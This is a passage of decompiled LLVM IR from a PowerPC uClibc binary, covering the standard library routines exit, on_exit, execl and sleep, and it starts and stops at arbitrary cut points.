  store i32 %v0_1001fd14, i32* @r8, align 4
  %v0_1001fd18.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001fd18

dec_label_pc_1001fd18:                            ; preds = %dec_label_pc_1001fce4, %dec_label_pc_1001fd00, %dec_label_pc_1001fd08
  %v0_1001fd28.pre = phi i32 [ %v0_1001fd28.pre.pre, %dec_label_pc_1001fd00 ], [ %v0_1001fd14, %dec_label_pc_1001fd08 ], [ %v0_1001fd28.pre.pre, %dec_label_pc_1001fce4 ]
  %v0_1001fd18 = phi i32 [ %v0_1001fce8, %dec_label_pc_1001fd00 ], [ %v0_1001fd18.pre, %dec_label_pc_1001fd08 ], [ %v0_1001fce8, %dec_label_pc_1001fce4 ]
  %v3_1001fd18 = icmp eq i32 %v0_1001fd18, 0
  br i1 %v3_1001fd18, label %dec_label_pc_1001fd24, label %dec_label_pc_1001fd20

dec_label_pc_1001fd20:                            ; preds = %dec_label_pc_1001fd18
  %v1_1001fd20 = sub i32 0, %v0_1001fd28.pre
  store i32 %v1_1001fd20, i32* @r8, align 4
  br label %dec_label_pc_1001fd24

dec_label_pc_1001fd24:                            ; preds = %dec_label_pc_1001fd18, %dec_label_pc_1001fd20
  %v0_1001fd28 = phi i32 [ %v1_1001fd20, %dec_label_pc_1001fd20 ], [ %v0_1001fd28.pre, %dec_label_pc_1001fd18 ]
  ret i32 %v0_1001fd28

; uselistorder directives
  uselistorder i32 %v0_1001fd28.pre, { 1, 0 }
  uselistorder i32 %v0_1001fd28.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1001fcd0, { 1, 0 }
  uselistorder i32 %v1_1001fc98, { 1, 0 }
  uselistorder i32 %v1_1001fc7c, { 2, 1, 0 }
  uselistorder i32 %v1_1001fc78, { 1, 0 }
  uselistorder i32 %v1_1001fc70, { 1, 0 }
  uselistorder i32 %v3_1001fc64, { 1, 0 }
  uselistorder i32 %v0_1001fccc, { 1, 0, 2 }
  uselistorder i32 %v1_1001fc6c, { 0, 2, 1 }
  uselistorder i32 %v0_1001fc60, { 2, 0, 1 }
  uselistorder i32 %v2_1001fc4c, { 1, 0, 2 }
  uselistorder i32 %v1_1001fc24, { 1, 0 }
  uselistorder i32 %v1_1001fc10, { 1, 0, 2 }
  uselistorder i32 %v0_1001fbec, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32 2147483647, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001fd24, { 1, 0 }
  uselistorder label %dec_label_pc_1001fd18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001fce4, { 1, 0 }
  uselistorder label %dec_label_pc_1001fc9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001fc64, { 1, 0 }
  uselistorder label %dec_label_pc_1001fc38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001fc2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001fbf0, { 1, 0 }
  uselistorder label %dec_label_pc_1001fbec, { 1, 0 }
  uselistorder label %dec_label_pc_1001fbb8, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001fd54 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001fd6c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_1004503c.1250 to i32))
  store i32 268565880, i32* @lr, align 4
  %v1_1001fd74 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004503c.1250 to i32))
  %v3_1001fd7c = load i32, i32* @global_var_10045244.1251, align 4
  %v3_1001fd80 = icmp eq i32 %v3_1001fd7c, 0
  br i1 %v3_1001fd80, label %dec_label_pc_1001fd94, label %dec_label_pc_1001fd88

dec_label_pc_1001fd88:                            ; preds = %entry
  %v1_1001fd90 = call i32 @unknown_0()
  br label %dec_label_pc_1001fd94

dec_label_pc_1001fd94:                            ; preds = %entry, %dec_label_pc_1001fd88
  store i32 %v2_1001fd54, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1001fda0.1252 to i32), i32* @lr, align 4
  %v0_1001fd9c = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_1001fd9c, i32* @r3, align 4
  store i32 268565924, i32* @lr, align 4
  %v1_1001fda0 = call i32 @__GI___uClibc_fini(i32 %v0_1001fd9c)
  store i32 268565944, i32* @lr, align 4
  %v2_1001fdb4 = call i32 @_stdio_term(i32 %v1_1001fda0, i32 268542612)
  %v0_1001fdb8 = load i32, i32* @r31, align 4
  %v1_1001fdbc = call i32 @__GI__exit(i32 %v0_1001fdb8)
  ret i32 %v1_1001fdbc

; uselistorder directives
  uselistorder label %dec_label_pc_1001fd94, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1001fdc0 = load i32, i32* @lr, align 4
  store i32 %v0_1001fdc0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001fddc.1253 to i32), i32* @lr, align 4
  %v0_1001fdd8 = call i32 @__new_exitfn()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v3_1001fde0 = icmp eq i32 %v0_1001fdd8, 0
  br i1 %v3_1001fde0, label %dec_label_pc_1001fdfc, label %dec_label_pc_1001fde8

dec_label_pc_1001fde8:                            ; preds = %entry
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001fdec = load i32, i32* @r31, align 4
  %v2_1001fdec = add i32 %v0_1001fdd8, 4
  %v3_1001fdec = inttoptr i32 %v2_1001fdec to i32*
  store i32 %v0_1001fdec, i32* %v3_1001fdec, align 4
  %v0_1001fdf0 = load i32, i32* @r30, align 4
  %v2_1001fdf0 = add i32 %v0_1001fdd8, 8
  %v3_1001fdf0 = inttoptr i32 %v2_1001fdf0 to i32*
  store i32 %v0_1001fdf0, i32* %v3_1001fdf0, align 4
  %v0_1001fdf4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001fdf4 = inttoptr i32 %v0_1001fdd8 to i32*
  store i32 %v0_1001fdf4, i32* %v2_1001fdf4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001fdfc

dec_label_pc_1001fdfc:                            ; preds = %entry, %dec_label_pc_1001fde8
  %v0_1001fdfc = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1001fde8 ]
  store i32 %v0_1001fdc0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001fdfc

; uselistorder directives
  uselistorder label %dec_label_pc_1001fdfc, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1001fe14 = ptrtoint i32* %stack_var_0 to i32
  %v2_1001fe30 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1001fe30, i32* %r0.global-to-local, align 4
  %v2_1001fe38 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1001fe30, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001fe64

dec_label_pc_1001fe64:                            ; preds = %dec_label_pc_1001fe94, %entry
  %v0_1001fe68 = phi i32 [ 0, %entry ], [ %v1_1001fe68, %dec_label_pc_1001fe94 ]
  %stack_var_-52.0 = phi i32 [ %v2_1001fe38, %entry ], [ %stack_var_-52.1, %dec_label_pc_1001fe94 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1001fe94 ]
  %v4_1001fe64 = zext i8 %stack_var_-56.0 to i32
  %v1_1001fe68 = add i32 %v0_1001fe68, 1
  %v1_1001fe70 = mul nuw nsw i32 %v4_1001fe64, 4
  store i32 %v1_1001fe70, i32* %r0.global-to-local, align 4
  %v2_1001fe74 = add i32 %v1_1001fe70, %v2_1001fe30
  store i32 %v2_1001fe74, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1001fe88, label %dec_label_pc_1001fe80

dec_label_pc_1001fe80:                            ; preds = %dec_label_pc_1001fe64
  %v1_1001fe78 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1001fe94

dec_label_pc_1001fe88:                            ; preds = %dec_label_pc_1001fe64
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1001fe8c = add i32 %stack_var_-52.0, 4
  store i32 %v1_1001fe8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001fe94

dec_label_pc_1001fe94:                            ; preds = %dec_label_pc_1001fe80, %dec_label_pc_1001fe88
  %stack_var_-52.1 = phi i32 [ %v1_1001fe8c, %dec_label_pc_1001fe88 ], [ %stack_var_-52.0, %dec_label_pc_1001fe80 ]
  %v0_1001fe94 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1001fe88 ], [ %v2_1001fe74, %dec_label_pc_1001fe80 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1001fe88 ], [ %v1_1001fe78, %dec_label_pc_1001fe80 ]
  %v1_1001fe94 = inttoptr i32 %v0_1001fe94 to i32*
  %v2_1001fe94 = load i32, i32* %v1_1001fe94, align 4
  store i32 %v2_1001fe94, i32* %r0.global-to-local, align 4
  %v3_1001fe98 = icmp eq i32 %v2_1001fe94, 0
  br i1 %v3_1001fe98, label %dec_label_pc_1001fea0, label %dec_label_pc_1001fe64

dec_label_pc_1001fea0:                            ; preds = %dec_label_pc_1001fe94
  %v1_1001fea0 = mul i32 %v1_1001fe68, 4
  store i32 %v4_1001fe14, i32* %r0.global-to-local, align 4
  %v1_1001fea8 = add i32 %v1_1001fea0, 34
  store i32 %v1_1001fe68, i32* %ctr.global-to-local, align 4
  %v1_1001feb0 = call i32 @__asm_rlwinm(i32 %v1_1001fea8, i32 0, i32 0, i32 27)
  %v1_1001feb8 = load i32, i32* @r1, align 4
  %v3_1001feb8 = sub i32 %v1_1001feb8, %v1_1001feb0
  %v4_1001feb8 = inttoptr i32 %v3_1001feb8 to i32*
  store i32 %v4_1001fe14, i32* %v4_1001feb8, align 4
  %v1_1001febc = add i32 %v3_1001feb8, 23
  store i32 %v1_1001febc, i32* %r0.global-to-local, align 4
  %v1_1001fec0 = call i32 @__asm_rlwinm(i32 %v1_1001febc, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001fec8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1001fec8 = inttoptr i32 %v1_1001fec0 to i32*
  store i32 %v0_1001fec8, i32* %v2_1001fec8, align 4
  store i32 %v1_1001fec0, i32* %r11.global-to-local, align 4
  %v0_1001fed0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001fed0 = trunc i32 %v0_1001fed0 to i8
  store i32 %v2_1001fe30, i32* %r0.global-to-local, align 4
  store i32 %v2_1001fe30, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1001fee4

dec_label_pc_1001fee4:                            ; preds = %dec_label_pc_1001ff18.dec_label_pc_1001fee4_crit_edge, %dec_label_pc_1001fea0
  %v0_1001fee8 = phi i32 [ %v1_1001fec0, %dec_label_pc_1001fea0 ], [ %v0_1001fee8.pre, %dec_label_pc_1001ff18.dec_label_pc_1001fee4_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1001fe38, %dec_label_pc_1001fea0 ], [ %stack_var_-52.3, %dec_label_pc_1001ff18.dec_label_pc_1001fee4_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1001fed0, %dec_label_pc_1001fea0 ], [ %stack_var_-56.3, %dec_label_pc_1001ff18.dec_label_pc_1001fee4_crit_edge ]
  %v1_1001fee8 = add i32 %v0_1001fee8, 4
  store i32 %v1_1001fee8, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1001ff0c, label %dec_label_pc_1001fefc

dec_label_pc_1001fefc:                            ; preds = %dec_label_pc_1001fee4
  %v4_1001fee4 = zext i8 %stack_var_-56.2 to i32
  %v1_1001fef4 = add i8 %stack_var_-56.2, 1
  %v1_1001fef0 = mul nuw nsw i32 %v4_1001fee4, 4
  %v3_1001fefc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1001fefc, i32* %r0.global-to-local, align 4
  %v2_1001ff04 = add i32 %v3_1001fefc, %v1_1001fef0
  br label %dec_label_pc_1001ff18

dec_label_pc_1001ff0c:                            ; preds = %dec_label_pc_1001fee4
  %v1_1001ff10 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1001ff10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001ff18

dec_label_pc_1001ff18:                            ; preds = %dec_label_pc_1001fefc, %dec_label_pc_1001ff0c
  %stack_var_-52.3 = phi i32 [ %v1_1001ff10, %dec_label_pc_1001ff0c ], [ %stack_var_-52.2, %dec_label_pc_1001fefc ]
  %v0_1001ff18 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1001ff0c ], [ %v2_1001ff04, %dec_label_pc_1001fefc ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1001ff0c ], [ %v1_1001fef4, %dec_label_pc_1001fefc ]
  %v1_1001ff18 = inttoptr i32 %v0_1001ff18 to i32*
  %v2_1001ff18 = load i32, i32* %v1_1001ff18, align 4
  store i32 %v2_1001ff18, i32* %r0.global-to-local, align 4
  %v2_1001ff1c = inttoptr i32 %v1_1001fee8 to i32*
  store i32 %v2_1001ff18, i32* %v2_1001ff1c, align 4
  %v0_1001ff20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ff20 = add i32 %v0_1001ff20, -1
  store i32 %v1_1001ff20, i32* %ctr.global-to-local, align 4
  %v2_1001ff20 = icmp eq i32 %v1_1001ff20, 0
  br i1 %v2_1001ff20, label %dec_label_pc_1001ff24, label %dec_label_pc_1001ff18.dec_label_pc_1001fee4_crit_edge

dec_label_pc_1001ff18.dec_label_pc_1001fee4_crit_edge: ; preds = %dec_label_pc_1001ff18
  %v0_1001fee8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001fee4

dec_label_pc_1001ff24:                            ; preds = %dec_label_pc_1001ff18
  %v3_1001ff28 = load i32, i32* @global_var_10045250.1254, align 4
  store i32 268566320, i32* @lr, align 4
  %v2_1001ff2c = call i32 @__GI_execve(i32 %v3_1001ff28, i32 268697600)
  %v0_1001ff30 = load i32, i32* @r1, align 4
  %v1_1001ff30 = inttoptr i32 %v0_1001ff30 to i32*
  %v2_1001ff30 = load i32, i32* %v1_1001ff30, align 4
  store i32 %v2_1001ff30, i32* %r11.global-to-local, align 4
  %v1_1001ff34 = add i32 %v2_1001ff30, 4
  %v2_1001ff34 = inttoptr i32 %v1_1001ff34 to i32*
  %v3_1001ff34 = load i32, i32* %v2_1001ff34, align 4
  store i32 %v3_1001ff34, i32* %r0.global-to-local, align 4
  ret i32 %v2_1001ff2c

; uselistorder directives
  uselistorder i32 %v1_1001ff20, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1001fe70, { 1, 0 }
  uselistorder i32 %v1_1001fe68, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1001fe30, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i8 1, { 0, 1, 15, 10, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 11, 26, 27, 28, 29, 12, 13, 14, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 2, 3, 50, 51, 49, 52, 53, 54, 55, 56, 9, 8, 7, 6, 5, 4, 57, 58, 59 }
  uselistorder label %dec_label_pc_1001ff18, { 1, 0 }
  uselistorder label %dec_label_pc_1001fe94, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* @r8, align 4
  %v3_1001ff48 = icmp eq i32 %arg1, 0
  br i1 %v3_1001ff48, label %dec_label_pc_100200fc, label %dec_label_pc_1001ff78.lr.ph

dec_label_pc_1001ff78.lr.ph:                      ; preds = %entry
  %v2_1001ff6c = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1001ff6c, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001ff7842 = add i32 %v2_1001ff6c, 132
  %v3_1001ff7843 = inttoptr i32 %v2_1001ff7842 to i32*
  store i32 0, i32* %v3_1001ff7843, align 4
  %v0_1001ff7c44 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ff7c45 = add i32 %v0_1001ff7c44, -1
  store i32 %v1_1001ff7c45, i32* %r11.global-to-local, align 4
  %v1_1001ff8046 = mul i32 %v1_1001ff7c45, 4
  %v1_1001ff8447 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001ff8448 = add i32 %v1_1001ff8447, %v1_1001ff8046
  %v0_1001ff8849 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ff8850 = add i32 %v0_1001ff8849, -1
  store i32 %v1_1001ff8850, i32* %ctr.global-to-local, align 4
  %v2_1001ff8851 = icmp eq i32 %v1_1001ff8850, 0
  br i1 %v2_1001ff8851, label %dec_label_pc_1001ff8c, label %dec_label_pc_1001ff78.dec_label_pc_1001ff78_crit_edge

dec_label_pc_1001ff78.dec_label_pc_1001ff78_crit_edge: ; preds = %dec_label_pc_1001ff78.lr.ph, %dec_label_pc_1001ff78.dec_label_pc_1001ff78_crit_edge
  %v2_1001ff8452 = phi i32 [ %v2_1001ff84, %dec_label_pc_1001ff78.dec_label_pc_1001ff78_crit_edge ], [ %v2_1001ff8448, %dec_label_pc_1001ff78.lr.ph ]
  %v0_1001ff78.pre = load i32, i32* @r10, align 4
  %v2_1001ff78 = add i32 %v2_1001ff8452, 8
  %v3_1001ff78 = inttoptr i32 %v2_1001ff78 to i32*
  store i32 %v0_1001ff78.pre, i32* %v3_1001ff78, align 4
  %v0_1001ff7c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ff7c = add i32 %v0_1001ff7c, -1
  store i32 %v1_1001ff7c, i32* %r11.global-to-local, align 4
  %v1_1001ff80 = mul i32 %v1_1001ff7c, 4
  %v1_1001ff84 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001ff84 = add i32 %v1_1001ff84, %v1_1001ff80
  %v0_1001ff88 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ff88 = add i32 %v0_1001ff88, -1
  store i32 %v1_1001ff88, i32* %ctr.global-to-local, align 4
  %v2_1001ff88 = icmp eq i32 %v1_1001ff88, 0
  br i1 %v2_1001ff88, label %dec_label_pc_1001ff8c, label %dec_label_pc_1001ff78.dec_label_pc_1001ff78_crit_edge

dec_label_pc_1001ff8c:                            ; preds = %dec_label_pc_1001ff78.dec_label_pc_1001ff78_crit_edge, %dec_label_pc_1001ff78.lr.ph
  %v0_1001ffa0.pre = load i32, i32* @r8, align 4
  %v2_1001ff8c = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1001ff8c, i32* %r29.global-to-local, align 4
  store i32 %v2_1001ff8c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1001ffa0.pre, i32* %stack_var_-440, align 4
  %v0_1001ffa4 = call i32 @__sigaddset()
  store i32 %v0_1001ffa4, i32* %r3.global-to-local, align 4
  %v1_1001ffa8 = icmp slt i32 %v0_1001ffa4, 0
  br i1 %v1_1001ffa8, label %dec_label_pc_10020104, label %dec_label_pc_1001ffb0

dec_label_pc_1001ffb0:                            ; preds = %dec_label_pc_1001ff8c
  %v2_1001ffb0 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268566468, i32* @lr, align 4
  %v3_1001ffc0 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1001ff8c, i32 %v2_1001ffb0)
  store i32 %v3_1001ffc0, i32* %r3.global-to-local, align 4
  %v3_1001ffc4 = icmp eq i32 %v3_1001ffc0, 0
  br i1 %v3_1001ffc4, label %dec_label_pc_1001ffcc, label %dec_label_pc_10020104

dec_label_pc_1001ffcc:                            ; preds = %dec_label_pc_1001ffb0
  store i32 %v2_1001ffb0, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1001ffd4 = call i32 @__sigismember()
  store i32 %v0_1001ffd4, i32* %r3.global-to-local, align 4
  %v3_1001ffd8 = icmp eq i32 %v0_1001ffd4, 0
  br i1 %v3_1001ffd8, label %dec_label_pc_1001fff8.lr.ph, label %dec_label_pc_100200c4

dec_label_pc_1001fff8.lr.ph:                      ; preds = %dec_label_pc_1001ffcc
  store i32 %v2_1001ff6c, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1001ff7843, align 4
  %v0_1001fffc33 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001fffc34 = add i32 %v0_1001fffc33, -1
  store i32 %v1_1001fffc34, i32* %r11.global-to-local, align 4
  %v1_1002000035 = mul i32 %v1_1001fffc34, 4
  %v1_1002000436 = load i32, i32* @r8, align 4
  %v2_1002000437 = add i32 %v1_1002000436, %v1_1002000035
  %v0_1002000838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1002000839 = add i32 %v0_1002000838, -1
  store i32 %v1_1002000839, i32* %ctr.global-to-local, align 4
  %v2_1002000840 = icmp eq i32 %v1_1002000839, 0
  br i1 %v2_1002000840, label %dec_label_pc_1002000c, label %dec_label_pc_1001fff8.dec_label_pc_1001fff8_crit_edge

dec_label_pc_1001fff8.dec_label_pc_1001fff8_crit_edge: ; preds = %dec_label_pc_1001fff8.lr.ph, %dec_label_pc_1001fff8.dec_label_pc_1001fff8_crit_edge
  %v2_1002000441 = phi i32 [ %v2_10020004, %dec_label_pc_1001fff8.dec_label_pc_1001fff8_crit_edge ], [ %v2_1002000437, %dec_label_pc_1001fff8.lr.ph ]
  %v0_1001fff8.pre = load i32, i32* @r10, align 4
  %v2_1001fff8 = add i32 %v2_1002000441, 8
  %v3_1001fff8 = inttoptr i32 %v2_1001fff8 to i32*
  store i32 %v0_1001fff8.pre, i32* %v3_1001fff8, align 4
  %v0_1001fffc = load i32, i32* %r11.global-to-local, align 4
  %v1_1001fffc = add i32 %v0_1001fffc, -1
  store i32 %v1_1001fffc, i32* %r11.global-to-local, align 4
  %v1_10020000 = mul i32 %v1_1001fffc, 4
  %v1_10020004 = load i32, i32* @r8, align 4
  %v2_10020004 = add i32 %v1_10020004, %v1_10020000
  %v0_10020008 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10020008 = add i32 %v0_10020008, -1
  store i32 %v1_10020008, i32* %ctr.global-to-local, align 4
  %v2_10020008 = icmp eq i32 %v1_10020008, 0
  br i1 %v2_10020008, label %dec_label_pc_1002000c, label %dec_label_pc_1001fff8.dec_label_pc_1001fff8_crit_edge

dec_label_pc_1002000c:                            ; preds = %dec_label_pc_1001fff8.dec_label_pc_1001fff8_crit_edge, %dec_label_pc_1001fff8.lr.ph
  store i32 %v2_1001ff8c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_10020014 = call i32 @__sigaddset()
  store i32 %v0_10020014, i32* %r3.global-to-local, align 4
  %v1_10020018 = icmp slt i32 %v0_10020014, 0
  br i1 %v1_10020018, label %dec_label_pc_10020104, label %dec_label_pc_10020020

dec_label_pc_10020020:                            ; preds = %dec_label_pc_1002000c
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10020028 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268566576, i32* @lr, align 4
  %v4_1002002c = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_10020028)
  store i32 %v4_1002002c, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1002002c, -1
  br i1 %tmp30, label %dec_label_pc_10020060, label %dec_label_pc_10020038

dec_label_pc_10020038:                            ; preds = %dec_label_pc_10020020
  %v0_10020038 = call i32 @__errno_location()
  store i32 %v0_10020038, i32* %r3.global-to-local, align 4
  %v1_10020040 = inttoptr i32 %v0_10020038 to i32*
  %v2_10020040 = load i32, i32* %v1_10020040, align 4
  store i32 %v0_10020038, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268566612, i32* @lr, align 4
  %v3_10020050 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1001ffb0, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10020058 = inttoptr i32 %v0_10020038 to i32*
  store i32 %v2_10020040, i32* %v2_10020058, align 4
  %v0_10020118.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020108

dec_label_pc_10020060:                            ; preds = %dec_label_pc_10020020
  %v3_10020060 = load i32, i32* %stack_var_-176, align 4
  %v3_1002006c = icmp eq i32 %v3_10020060, 1
  br i1 %v3_1002006c, label %dec_label_pc_10020074, label %dec_label_pc_100200a8

dec_label_pc_10020074:                            ; preds = %dec_label_pc_10020060
  store i32 %v2_1001ff6c, i32* %r3.global-to-local, align 4
  store i32 268566656, i32* @lr, align 4
  %v2_1002007c = call i32 @nanosleep(i32 %v2_1001ff6c, i32 %v2_1001ff6c)
  store i32 %v2_1002007c, i32* %r3.global-to-local, align 4
  store i32 %v2_1002007c, i32* @r31, align 4
  %v0_10020084 = call i32 @__errno_location()
  store i32 %v0_10020084, i32* %r3.global-to-local, align 4
  store i32 %v0_10020084, i32* %r29.global-to-local, align 4
  %v1_10020094 = inttoptr i32 %v0_10020084 to i32*
  %v2_10020094 = load i32, i32* %v1_10020094, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268566688, i32* @lr, align 4
  %v3_1002009c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1001ffb0, i32 0)
  store i32 %v3_1002009c, i32* %r3.global-to-local, align 4
  %v1_100200a0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100200a0 = inttoptr i32 %v1_100200a0 to i32*
  store i32 %v2_10020094, i32* %v2_100200a0, align 4
  %v0_100200d0.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_100200d0

dec_label_pc_100200a8:                            ; preds = %dec_label_pc_10020060
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268566712, i32* @lr, align 4
  %v3_100200b4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1001ffb0, i32 0)
  br label %dec_label_pc_100200c4

dec_label_pc_100200c4:                            ; preds = %dec_label_pc_1001ffcc, %dec_label_pc_100200a8
  store i32 %v2_1001ff6c, i32* %r3.global-to-local, align 4
  store i32 268566732, i32* @lr, align 4
  %v2_100200c8 = call i32 @nanosleep(i32 %v2_1001ff6c, i32 %v2_1001ff6c)
  store i32 %v2_100200c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100200d0

dec_label_pc_100200d0:                            ; preds = %dec_label_pc_10020074, %dec_label_pc_100200c4
  %v0_100200d0 = phi i32 [ %v0_100200d0.pr, %dec_label_pc_10020074 ], [ %v2_100200c8, %dec_label_pc_100200c4 ]
  %v3_100200d0 = icmp eq i32 %v0_100200d0, 0
  br i1 %v3_100200d0, label %dec_label_pc_100200fc, label %dec_label_pc_100200d8

dec_label_pc_100200d8:                            ; preds = %dec_label_pc_100200d0
  %v3_100200e8 = load i32, i32* %stack_var_-440, align 4
  %v0_100200ec = call i32 @__asm_mfcr()
  store i32 %v0_100200ec, i32* %r3.global-to-local, align 4
  %v1_100200f0 = call i32 @__asm_rlwinm(i32 %v0_100200ec, i32 30, i32 31, i32 31)
  %v2_100200f4 = add i32 %v3_100200e8, %v1_100200f0
  store i32 %v2_100200f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020108

dec_label_pc_100200fc:                            ; preds = %dec_label_pc_100200d0, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020108

dec_label_pc_10020104:                            ; preds = %dec_label_pc_1001ffb0, %dec_label_pc_1002000c, %dec_label_pc_1001ff8c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020108

dec_label_pc_10020108:                            ; preds = %dec_label_pc_100200fc, %dec_label_pc_100200d8, %dec_label_pc_10020038, %dec_label_pc_10020104
